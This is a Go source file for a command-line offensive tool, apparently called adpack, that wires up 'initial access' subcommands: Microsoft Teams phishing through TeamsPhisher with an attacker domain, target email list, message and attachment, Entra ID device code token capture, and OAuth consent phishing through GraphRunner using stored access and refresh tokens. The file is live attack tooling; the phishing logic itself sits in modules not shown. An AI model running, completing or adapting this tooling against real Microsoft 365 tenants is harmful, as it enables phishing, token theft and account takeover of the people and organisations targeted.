package cmd

import (
	"context"
	"fmt"

	"adpack/modules"
	"adpack/tools"
	"github.com/spf13/cobra"
)

var (
	initialTeamsDomain      string
	initialTeamsTargets     string
	initialTeamsMessage     string
	initialTeamsAttachment  string
	initialDeviceCodeClient string
	initialConsentAppURL    string
)

var initialCmd = &cobra.Command{
	Use:   "initial",
	Short: "Initial access techniques (Teams phishing, device code auth)",
}

var initialTeamsCmd = &cobra.Command{
	Use:   "teams",
	Short: "Phish via Microsoft Teams using TeamsPhisher",
	RunE: func(cmd *cobra.Command, args []string) error {
		state, err := DB.LoadState()
		if err != nil {
			return fmt.Errorf("load state: %w", err)
		}
		config := tools.TeamsPhishConfig{
			AttackerDomain: initialTeamsDomain,
			TargetsFile:    initialTeamsTargets,
			Message:        initialTeamsMessage,
			AttachmentPath: initialTeamsAttachment,
		}
		result := modules.RunTeamsPhish(context.Background(), state, config)
		if !result.Success {
			return fmt.Errorf("teams phish failed")
		}
		if err := DB.SaveState(state); err != nil {
			return fmt.Errorf("save state: %w", err)
		}
		fmt.Println("[+] Teams phishing complete")
		return nil
	},
}

var initialDeviceCodeCmd = &cobra.Command{
	Use:   "device-code",
	Short: "Obtain Entra ID token via device code auth (interactive)",
	RunE: func(cmd *cobra.Command, args []string) error {
		state, err := DB.LoadState()
		if err != nil {
			return fmt.Errorf("load state: %w", err)
		}
		client := initialDeviceCodeClient
		if client == "" {
			client = "MSGraph"
		}
		result := modules.RunDeviceCodeAuth(context.Background(), state, client)
		if !result.Success {
			return fmt.Errorf("device code auth failed")
		}
		if err := DB.SaveState(state); err != nil {
			return fmt.Errorf("save state: %w", err)
		}
		fmt.Println("[+] Device code auth complete")
		return nil
	},
}

var initialConsentCmd = &cobra.Command{
	Use:   "consent-phish",
	Short: "OAuth consent phishing via GraphRunner",
	RunE: func(cmd *cobra.Command, args []string) error {
		state, err := DB.LoadState()
		if err != nil {
			return fmt.Errorf("load state: %w", err)
		}
		var tokens *tools.GraphTokens
		for _, t := range state.Tokens {
			if t.Type == "access" && t.Secret != "" {
				tokens = &tools.GraphTokens{
					AccessToken:  t.Secret,
					RefreshToken: t.RefreshToken,
					TenantID:     t.Tenant,
				}
				break
			}
		}
		result := modules.RunOAuthConsentPhish(context.Background(), state, tokens, initialConsentAppURL)
		if !result.Success {
			return fmt.Errorf("OAuth consent phish failed")
		}
		if err := DB.SaveState(state); err != nil {
			return fmt.Errorf("save state: %w", err)
		}
		fmt.Println("[+] OAuth consent phishing complete")
		return nil
	},
}

func init() {
	rootCmd.AddCommand(initialCmd)
	initialCmd.AddCommand(initialTeamsCmd)
	initialCmd.AddCommand(initialDeviceCodeCmd)
	initialCmd.AddCommand(initialConsentCmd)

	initialTeamsCmd.Flags().StringVarP(&initialTeamsDomain, "domain", "d", "", "Attacker's M365 domain")
	initialTeamsCmd.Flags().StringVarP(&initialTeamsTargets, "targets", "T", "", "Target emails file")
	initialTeamsCmd.Flags().StringVarP(&initialTeamsMessage, "message", "m", "", "Phishing message text")
	initialTeamsCmd.Flags().StringVarP(&initialTeamsAttachment, "attachment", "a", "", "Attachment path")

	initialDeviceCodeCmd.Flags().StringVarP(&initialDeviceCodeClient, "client", "", "MSGraph", "OAuth client (MSGraph, Outlook, AzureManagement)")

	initialConsentCmd.Flags().StringVarP(&initialConsentAppURL, "app-url", "u", "", "OAuth app URL for consent phish")
}
